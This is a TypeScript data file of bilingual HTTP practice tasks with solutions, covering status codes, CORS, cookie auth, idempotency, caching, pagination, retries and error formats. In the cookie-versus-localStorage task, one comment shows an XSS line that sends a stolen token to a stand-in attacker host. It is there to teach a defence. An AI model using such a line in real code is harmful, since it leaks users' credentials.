import type { PracticeTask } from '../../../entities/module/model/types';

const L = (en: string, ru: string) => ({ en, ru });

export const httpTasks: PracticeTask[] = [
  {
    id: 'http-task-4',
    topic: 'http',
    level: 'basic',
    title: L('Pick the right status code', 'Выбрать правильный статус-код'),
    brief: L(
      'Match each scenario with the correct response status: reading an article, creating one, deleting one, sending invalid JSON, missing token, insufficient role, unknown id, duplicate email, semantically invalid field and an overloaded upstream.',
      'Сопоставьте каждый сценарий с правильным статусом ответа: чтение статьи, создание, удаление, неверный JSON, отсутствующий токен, недостаточная роль, неизвестный id, занятый email, семантически неверное поле и перегруженный внешний сервис.'
    ),
    hint: L(
      'Distinguish 401 from 403 and 400 from 422. 204 has no response body.',
      'Различайте 401 и 403, а также 400 и 422. У 204 нет тела ответа.'
    ),
    solution: `GET    /api/articles/42              -> 200 OK
POST   /api/articles                 -> 201 Created + Location: /api/articles/43
DELETE /api/articles/42              -> 204 No Content
POST   /api/articles  (broken JSON)  -> 400 Bad Request
GET    /api/private   (no token)     -> 401 Unauthorized + WWW-Authenticate
GET    /api/private   (wrong role)   -> 403 Forbidden
GET    /api/articles/999             -> 404 Not Found
POST   /api/users     (email taken)  -> 409 Conflict
PATCH  /api/articles/42 (bad title)  -> 422 Unprocessable Entity
GET    /api/feed      (upstream down)-> 503 Service Unavailable + Retry-After: 30`,
    explanation: L(
      '401 means the client is not authenticated, 403 means it is authenticated but not allowed. 400 is a malformed request, 422 is well-formed but invalid data. 409 signals a state conflict and 503 tells the client to retry later.',
      '401 означает, что клиент не аутентифицирован, 403 — что он аутентифицирован, но не имеет прав. 400 — некорректный запрос, 422 — корректный по форме, но неверный по данным. 409 сообщает о конфликте состояния, а 503 просит повторить позже.'
    ),
  },
  {
    id: 'http-task-5',
    topic: 'security',
    level: 'basic',
    title: L('Send JSON with authorization', 'Отправить JSON с авторизацией'),
    brief: L(
      'Write a POST request that creates an article as JSON, declares the body type, asks for a JSON response and sends a bearer token. Show the same request as raw HTTP and as fetch.',
      'Напишите POST-запрос, который создаёт статью в JSON, объявляет тип тела, ожидает JSON-ответ и передаёт bearer-токен. Покажите тот же запрос в виде сырого HTTP и через fetch.'
    ),
    hint: L(
      'Content-Type describes the request body, Accept describes the response you want, Authorization carries the credentials.',
      'Content-Type описывает тело запроса, Accept — желаемый ответ, Authorization передаёт учётные данные.'
    ),
    solution: `POST /api/articles HTTP/1.1
Host: api.example.com
Content-Type: application/json
Accept: application/json
Authorization: Bearer <access-token>

{"title":"HTTP headers","published":true}

// fetch equivalent
async function createArticle(article, token) {
  const response = await fetch('/api/articles', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Accept: 'application/json',
      Authorization: 'Bearer ' + token,
    },
    body: JSON.stringify(article),
  });

  if (!response.ok) {
    throw new Error('HTTP ' + response.status);
  }

  return response.json();
}`,
    explanation: L(
      'Without Content-Type the server may parse the body as text or reject it with 415. Accept is a preference, not a guarantee, so the client must still check the actual Content-Type of the response.',
      'Без Content-Type сервер может разобрать тело как текст или отклонить запрос с 415. Accept — это пожелание, а не гарантия, поэтому клиент всё равно должен проверять фактический Content-Type ответа.'
    ),
  },
  {
    id: 'http-task-6',
    topic: 'http',
    level: 'basic',
    title: L('Explain a CORS preflight', 'Разобрать CORS preflight'),
    brief: L(
      'Write the preflight request and response for a browser app on https://app.example.com that sends PUT with a JSON body and an Authorization header to https://api.example.com. Name the headers that make the request non-simple.',
      'Напишите preflight-запрос и ответ для браузерного приложения на https://app.example.com, которое отправляет PUT с JSON-телом и заголовком Authorization на https://api.example.com. Назовите заголовки, из-за которых запрос перестаёт быть простым.'
    ),
    hint: L(
      'The browser sends OPTIONS automatically. The server must allow the origin, the method and every non-simple request header.',
      'Браузер сам отправляет OPTIONS. Сервер должен разрешить origin, метод и каждый нестандартный заголовок запроса.'
    ),
    solution: `OPTIONS /api/articles/42 HTTP/1.1
Origin: https://app.example.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: content-type, authorization

HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT, PATCH, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 600
Vary: Origin`,
    explanation: L(
      'A simple request is limited to GET, HEAD or POST with form-friendly content types and no custom headers. PUT and Authorization force a preflight. The actual request is sent only after the browser accepts the preflight response. Allow-Origin: * cannot be combined with credentials.',
      'Простой запрос ограничен GET, HEAD или POST с form-совместимыми типами контента и без кастомных заголовков. PUT и Authorization вызывают preflight. Реальный запрос уходит только после того, как браузер примет ответ на preflight. Allow-Origin: * нельзя сочетать с credentials.'
    ),
  },
  {
    id: 'http-task-7',
    topic: 'security',
    level: 'intermediate',
    title: L('Choose cookie auth over localStorage', 'Выбрать cookie-аутентификацию вместо localStorage'),
    brief: L(
      'Compare storing an access token in localStorage with an httpOnly cookie, then show the secure cookie setup and the client request. Explain which attacks each option exposes you to.',
      'Сравните хранение access-токена в localStorage и в httpOnly cookie, затем покажите безопасную настройку cookie и клиентский запрос. Объясните, каким атакам подвержен каждый вариант.'
    ),
    hint: L(
      'Script on the page can read localStorage but cannot read an httpOnly cookie. A cookie that is sent automatically needs CSRF protection.',
      'Скрипт на странице может прочитать localStorage, но не httpOnly cookie. Cookie, который отправляется автоматически, требует защиты от CSRF.'
    ),
    solution: `// Server: issue an httpOnly session cookie
Set-Cookie: session=<opaque-id>; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=900

// Client: send cookies on a same-site API call
await fetch('/api/me', {
  credentials: 'include',
  headers: { 'X-CSRF-Token': csrfToken },
});

// localStorage option: any injected script can read it
const token = localStorage.getItem('access_token');
// XSS -> fetch('https://evil.test?t=' + token)`,
    explanation: L(
      'localStorage is readable by any JavaScript on the origin, so one XSS bug leaks the token. An httpOnly cookie is invisible to scripts and can be marked Secure and SameSite. The trade-off is automatic sending, which enables CSRF, so pair it with SameSite, a CSRF token and origin checks. Prefer short-lived access tokens plus rotation for refresh tokens.',
      'localStorage доступен любому JavaScript на origin, поэтому одна XSS-уязвимость раскрывает токен. httpOnly cookie невидим для скриптов и может быть помечен Secure и SameSite. Плата за это — автоматическая отправка, которая включает CSRF, поэтому нужны SameSite, CSRF-токен и проверка origin. Предпочитайте короткоживущие access-токены и ротацию refresh-токенов.'
    ),
  },
  {
    id: 'http-task-8',
    topic: 'http',
    level: 'intermediate',
    title: L('PUT versus PATCH and idempotency', 'PUT и PATCH: идемпотентность'),
    brief: L(
      'Update an article title with PUT and with PATCH, then change a view counter with PATCH. Which calls are idempotent, and what happens if the network retries each one?',
      'Обновите заголовок статьи через PUT и через PATCH, затем измените счётчик просмотров через PATCH. Какие вызовы идемпотентны и что произойдёт, если сеть повторит каждый из них?'
    ),
    hint: L(
      'PUT replaces the whole resource with the representation you send. PATCH applies a change to the current state.',
      'PUT заменяет ресурс целиком присланным представлением. PATCH применяет изменение к текущему состоянию.'
    ),
    solution: `# PUT replaces the full representation: retry-safe
PUT /api/articles/42
Content-Type: application/json

{"title":"HTTP caching","body":"...","published":true,"tags":["http"]}

# PATCH updates only the title: the same result on every retry
PATCH /api/articles/42
Content-Type: application/json

{"title":"HTTP caching"}

# PATCH increments state: NOT idempotent, two retries add two views
PATCH /api/articles/42
Content-Type: application/json

{"$increment":{"views":1}}`,
    explanation: L(
      'PUT is idempotent because sending the same full representation twice leaves the same state. A PATCH that sets a field is also safely repeatable. A PATCH that increments or appends is not, so retries need an idempotency key or a version check such as If-Match.',
      'PUT идемпотентен: повторная отправка того же полного представления оставляет то же состояние. PATCH, который задаёт поле, тоже безопасно повторять. PATCH, который увеличивает счётчик или добавляет элемент, — нет, поэтому для повторов нужен idempotency key или проверка версии через If-Match.'
    ),
  },
  {
    id: 'http-task-9',
    topic: 'http',
    level: 'intermediate',
    title: L('Conditional requests with ETag', 'Условные запросы с ETag'),
    brief: L(
      'Show the first response for an article, then a revalidation request that avoids downloading an unchanged body. Include the response status and the caching headers.',
      'Покажите первый ответ для статьи, затем запрос ревалидации, который не скачивает неизменённое тело. Укажите статус ответа и заголовки кеширования.'
    ),
    hint: L(
      'The server returns an ETag. The next request sends it back as If-None-Match and receives 304 without a body.',
      'Сервер возвращает ETag. Следующий запрос отправляет его обратно в If-None-Match и получает 304 без тела.'
    ),
    solution: `# First request
curl -i https://api.example.com/api/articles/42
# HTTP/1.1 200 OK
# ETag: "v7"
# Cache-Control: private, max-age=0, must-revalidate

# Revalidation
curl -i -H 'If-None-Match: "v7"' https://api.example.com/api/articles/42
# HTTP/1.1 304 Not Modified
# ETag: "v7"
# (no body)

# Writes must invalidate the cached entry
PATCH /api/articles/42   -> 200 OK, ETag: "v8"`,
    explanation: L(
      'The client stores the body together with the ETag. Sending If-None-Match lets the server answer 304, which saves bandwidth but still costs a round trip. max-age=0 forces revalidation; a longer max-age lets the browser skip the request entirely. After a write the ETag changes, so stale copies are no longer accepted.',
      'Клиент хранит тело вместе с ETag. If-None-Match позволяет серверу ответить 304, что экономит трафик, но всё равно требует round trip. max-age=0 заставляет ревалидировать; больший max-age позволяет браузеру вообще не делать запрос. После записи ETag меняется, поэтому устаревшие копии больше не принимаются.'
    ),
  },
  {
    id: 'http-task-10',
    topic: 'http',
    level: 'intermediate',
    title: L('Paginate a list with a cursor', 'Пагинация списка курсором'),
    brief: L(
      'Design a cursor-paginated articles endpoint for an infinite scroll: describe the first request, the next request and the response shape. Explain why a cursor beats an offset here.',
      'Спроектируйте эндпоинт статей с cursor-пагинацией для бесконечной ленты: опишите первый запрос, следующий запрос и форму ответа. Объясните, почему курсор лучше offset.'
    ),
    hint: L(
      'Return a stable sort key with the page. The client sends the last key back instead of a page number.',
      'Возвращайте вместе со страницей стабильный ключ сортировки. Клиент присылает последний ключ вместо номера страницы.'
    ),
    solution: `GET /api/articles?limit=20

{
  "data": [
    { "id": "art_42", "title": "HTTP caching", "createdAt": "2026-10-19T10:00:00Z" }
  ],
  "pageInfo": { "nextCursor": "c_9f2a", "hasNextPage": true }
}

GET /api/articles?limit=20&cursor=c_9f2a

{
  "data": [ ... ],
  "pageInfo": { "nextCursor": null, "hasNextPage": false }
}

# Server-side ordering must be stable:
# ORDER BY created_at DESC, id DESC
# WHERE (created_at, id) < (last_created_at, last_id)`,
    explanation: L(
      'An offset shifts when rows are inserted or deleted, so items are skipped or repeated. A cursor points at a stable position in the sorted result, which keeps infinite scroll consistent. The cursor should be opaque and validated, and the sort must include a unique tiebreaker such as id.',
      'Offset смещается при вставке или удалении строк, поэтому элементы пропускаются или повторяются. Курсор указывает на стабильную позицию в отсортированном результате, что делает бесконечную ленту согласованной. Курсор должен быть непрозрачным и проверяемым, а сортировка — включать уникальный tiebreaker, например id.'
    ),
  },
  {
    id: 'http-task-11',
    topic: 'http',
    level: 'advanced',
    title: L('Handle 429 with Retry-After', 'Обработать 429 и Retry-After'),
    brief: L(
      'Write a request helper that retries on 429, respects the Retry-After header in seconds, falls back to exponential backoff with jitter and gives up after four attempts.',
      'Напишите помощник запросов, который повторяет запрос при 429, соблюдает Retry-After в секундах, использует экспоненциальный backoff с джиттером как запасной вариант и сдаётся после четырёх попыток.'
    ),
    hint: L(
      'Retry-After may be a number of seconds or an HTTP date. Read it with response.headers.get and clamp the wait.',
      'Retry-After может быть числом секунд или HTTP-датой. Прочитайте его через response.headers.get и ограничьте ожидание.'
    ),
    solution: `async function requestWithBackoff(url, options = {}, attempt = 0) {
  const response = await fetch(url, options);

  if (response.status !== 429 || attempt >= 4) {
    return response;
  }

  const header = response.headers.get('Retry-After');
  const seconds = Number(header);
  const base = Number.isFinite(seconds) && seconds > 0
    ? seconds * 1000
    : 500 * 2 ** attempt;
  const jitter = Math.random() * 250;

  await new Promise((resolve) => setTimeout(resolve, base + jitter));
  return requestWithBackoff(url, options, attempt + 1);
}

const response = await requestWithBackoff('/api/articles');`,
    explanation: L(
      'Retry-After is authoritative: if the server says 30 seconds, retrying earlier only wastes quota. Jitter spreads retries from many clients so they do not hit the service in one wave. Only retry idempotent or idempotency-keyed requests, and cap both attempts and total waiting time.',
      'Retry-After имеет приоритет: если сервер просит 30 секунд, ранний повтор только тратит квоту. Джиттер разводит повторы множества клиентов, чтобы они не ударили по сервису одной волной. Повторяйте только идемпотентные запросы или запросы с idempotency key и ограничивайте число попыток и общее время ожидания.'
    ),
  },
  {
    id: 'http-task-12',
    topic: 'http',
    level: 'advanced',
    title: L('SSE or WebSocket for live updates', 'SSE или WebSocket для живых обновлений'),
    brief: L(
      'A dashboard needs live order statuses; a chat needs messages in both directions. Show a minimal SSE client and server event, a minimal WebSocket client, and choose the right transport for each feature.',
      'Дашборду нужны живые статусы заказов, чату — сообщения в обе стороны. Покажите минимальный SSE-клиент и серверное событие, минимальный WebSocket-клиент и выберите подходящий транспорт для каждой задачи.'
    ),
    hint: L(
      'SSE is one-way server to client over plain HTTP and reconnects automatically. WebSocket is bidirectional and needs its own reconnect logic.',
      'SSE — односторонний поток от сервера к клиенту поверх обычного HTTP с автоматическим переподключением. WebSocket двунаправленный и требует своей логики переподключения.'
    ),
    solution: `// SSE: server -> client only
const events = new EventSource('/api/orders/stream');

events.addEventListener('order.paid', (event) => {
  const order = JSON.parse(event.data);
  updateRow(order.id, 'paid');
});

events.onerror = () => {
  // EventSource reconnects by itself; close() to stop it
};

// Server response
// Content-Type: text/event-stream
// Cache-Control: no-cache
//
// event: order.paid
// data: {"id":"ord_42","total":9900}
// retry: 3000

// WebSocket: both directions
const socket = new WebSocket('wss://api.example.com/ws');

socket.addEventListener('open', () => {
  socket.send(JSON.stringify({ type: 'subscribe', channel: 'orders' }));
});

socket.addEventListener('message', (event) => {
  renderMessage(JSON.parse(event.data));
});`,
    explanation: L(
      'Use SSE for server-push feeds: it is HTTP-friendly, survives proxies, supports event names and resumes with Last-Event-ID. Use WebSocket when the client also streams data, for example chat, typing indicators or collaborative editing. WebSocket gives lower overhead but you must implement reconnects, heartbeats and backpressure yourself.',
      'Используйте SSE для потоков от сервера: он дружелюбен к HTTP, проходит через прокси, поддерживает имена событий и возобновление через Last-Event-ID. WebSocket нужен, когда клиент тоже отправляет поток данных: чат, индикатор набора, совместное редактирование. WebSocket даёт меньшие накладные расходы, но переподключение, heartbeat и backpressure придётся реализовать самостоятельно.'
    ),
  },
  {
    id: 'http-task-13',
    topic: 'errors',
    level: 'advanced',
    title: L('Debug a failing request with curl', 'Отладить падающий запрос через curl'),
    brief: L(
      'A browser POST returns 415 and then 401 from the terminal. Write the curl commands that reveal the real status, request and response headers, the redirect chain and the total time, and name the usual causes.',
      'POST из браузера возвращает 415, а из терминала 401. Напишите команды curl, которые показывают реальный статус, заголовки запроса и ответа, цепочку редиректов и общее время, и назовите типичные причины.'
    ),
    hint: L(
      'Use -i for headers, -v for the full exchange, -L to follow redirects and -w for timings. Quote JSON carefully in the shell.',
      'Используйте -i для заголовков, -v для полного обмена, -L для перехода по редиректам и -w для таймингов. Аккуратно экранируйте JSON в shell.'
    ),
    solution: `# Full exchange: request line, headers, status
curl -v -X POST https://api.example.com/api/articles \\
  -H 'Content-Type: application/json' \\
  -H "Authorization: Bearer $TOKEN" \\
  --data-raw '{"title":"Hello"}'

# Status + headers only, follow redirects, show final code
curl -sS -i -L -o /dev/null \\
  -w '%{http_code} %{time_total}s\\n' \\
  https://api.example.com/api/articles

# 415: body sent without Content-Type, or as text/plain
# 401: token missing, expired, or sent as "Basic" instead of "Bearer"
# 301/302 on POST: many clients switch to GET and drop the body
# Check whether a proxy strips Authorization`,
    explanation: L(
      'Verbose output separates a client problem from a server problem. 415 means the server refused the media type, so inspect the actual Content-Type. 401 means credentials were absent or rejected, so compare the Authorization header with a known-good token. Redirects on POST often turn into GET, which silently loses the body.',
      'Подробный вывод отделяет проблему клиента от проблемы сервера. 415 означает, что сервер отклонил media type, поэтому проверьте фактический Content-Type. 401 означает, что учётные данные отсутствуют или отклонены, поэтому сравните заголовок Authorization с заведомо рабочим токеном. Редиректы на POST часто превращаются в GET и молча теряют тело.'
    ),
  },
  {
    id: 'http-task-14',
    topic: 'http',
    level: 'advanced',
    title: L('Retry POST safely with idempotency keys', 'Безопасно повторять POST с idempotency key'),
    brief: L(
      'Write a createOrder function that retries network errors, 429 and 5xx three times while reusing one Idempotency-Key, and never retries 4xx validation errors. Describe what the server must store.',
      'Напишите createOrder, который повторяет сетевые ошибки, 429 и 5xx три раза, используя один и тот же Idempotency-Key, и не повторяет 4xx-ошибки валидации. Опишите, что должен хранить сервер.'
    ),
    hint: L(
      'Generate the key once per logical operation, outside the loop. The server stores the key together with the final response.',
      'Сгенерируйте ключ один раз на логическую операцию, вне цикла. Сервер хранит ключ вместе с итоговым ответом.'
    ),
    solution: `async function createOrder(payload) {
  const key = crypto.randomUUID();

  for (let attempt = 0; attempt < 3; attempt++) {
    try {
      const response = await fetch('/api/orders', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Idempotency-Key': key,
        },
        body: JSON.stringify(payload),
      });

      if (response.status < 500 && response.status !== 429) {
        return response.json();
      }
    } catch (error) {
      if (attempt === 2) throw error;
    }

    await new Promise((resolve) => setTimeout(resolve, 300 * 2 ** attempt));
  }

  throw new Error('Order creation failed');
}

// Server: UNIQUE(idempotency_key)
// store status + response body + created_at (e.g. 24h)
// same key + same body -> replay stored response
// same key + different body -> 422`,
    explanation: L(
      'A POST is not idempotent by default, so a retry can create two orders. The key makes the pair of request and retry one logical operation: the server returns the stored result instead of executing again. Validation failures will not fix themselves, so 4xx responses (except 429) must not be retried.',
      'POST не идемпотентен по умолчанию, поэтому повтор может создать два заказа. Ключ превращает запрос и его повтор в одну логическую операцию: сервер возвращает сохранённый результат вместо повторного выполнения. Ошибки валидации сами не исчезнут, поэтому 4xx (кроме 429) повторять нельзя.'
    ),
  },
  {
    id: 'http-task-15',
    topic: 'http',
    level: 'advanced',
    title: L('One error envelope for the whole API', 'Единый формат ошибок для всего API'),
    brief: L(
      'Define one JSON error shape for validation, authentication and server failures. Show a validation error response, a 500 response and client code that parses both without guessing.',
      'Определите единую JSON-форму ошибки для валидации, аутентификации и сбоев сервера. Покажите ответ с ошибкой валидации, ответ 500 и клиентский код, который разбирает оба без догадок.'
    ),
    hint: L(
      'Separate a stable machine code from a human message. Add a request id for logs and keep internal details out of the response.',
      'Отделите стабильный машинный код от сообщения для человека. Добавьте request id для логов и не раскрывайте внутренние детали в ответе.'
    ),
    solution: `// 422
{
  "error": {
    "code": "validation_failed",
    "message": "Title must be between 3 and 120 characters.",
    "details": [
      { "field": "title", "issue": "too_short" }
    ],
    "requestId": "req_8f21c"
  }
}

// 500 - no stack trace, no SQL, no internal paths
{
  "error": {
    "code": "internal_error",
    "message": "Something went wrong. Please try again.",
    "requestId": "req_8f21d"
  }
}

// Client
async function readError(response) {
  const body = await response.json().catch(() => null);
  const error = body?.error;
  return {
    code: error?.code ?? 'http_' + response.status,
    message: error?.message ?? response.statusText,
    details: error?.details ?? [],
    requestId: error?.requestId ?? null,
  };
}`,
    explanation: L(
      'Clients should branch on error.code, never on the message text, because messages are translated and reworded. A stable code also lets the UI map errors to fields or retry actions. requestId connects a user report to one server log entry, while omitting internals prevents leaking implementation details.',
      'Клиент должен ветвиться по error.code, а не по тексту сообщения, потому что сообщения переводят и переписывают. Стабильный код также позволяет UI сопоставить ошибку с полем или действием повтора. requestId связывает жалобу пользователя с записью в логе сервера, а отсутствие внутренних деталей предотвращает утечку реализации.'
    ),
  },
];
